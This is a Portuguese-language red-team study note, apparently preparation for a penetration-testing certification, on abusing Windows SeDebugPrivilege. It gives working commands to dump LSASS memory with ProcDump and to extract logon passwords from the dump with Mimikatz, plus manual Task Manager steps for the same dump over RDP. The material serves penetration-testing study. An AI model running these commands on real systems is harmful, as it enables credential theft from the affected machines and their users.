> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/seedebugprivilege.md).

# SeeDebugPrivilege

Para executar um aplicativo ou serviço específico ou auxiliar na resolução de problemas, um usuário pode receber o privilégio [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) em vez de ser adicionado ao grupo de administradores.

* Após fazer login como um usuário com os `Debug programs`direitos atribuídos e abrir um shell com privilégios elevados, vemos `SeDebugPrivilege`que está listado.

```powershell
whoami /priv
```

* Podemos usar [o ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) do pacote [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para aproveitar esse privilégio e despejar a memória do processo.

```ps
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

* Se isso for bem-sucedido  podemos carregar o sistema `Mimikatz` usando o `sekurlsa::minidump` comando

{% code lineNumbers="true" %}

```ps
C:\htb> mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

{% endcode %}

* Suponha que, por algum motivo, não seja possível instalar as ferramentas no alvo, mas tenhamos acesso RDP:&#x20;

{% code lineNumbers="true" %}

```
Abrir o Gerenciador de Tarefas
Ir para a aba Detalhes (Details)
Localizar o processo LSASS (lsass.exe)
Clicar com o botão direito no processo
Selecionar “Criar arquivo de despejo de memória” (Create dump file)
Aguardar a geração do arquivo dump
Copiar/transferir o arquivo para a máquina atacante
Abrir o arquivo usando o Mimikatz
Extrair as credenciais a partir do dump
```

{% endcode %}
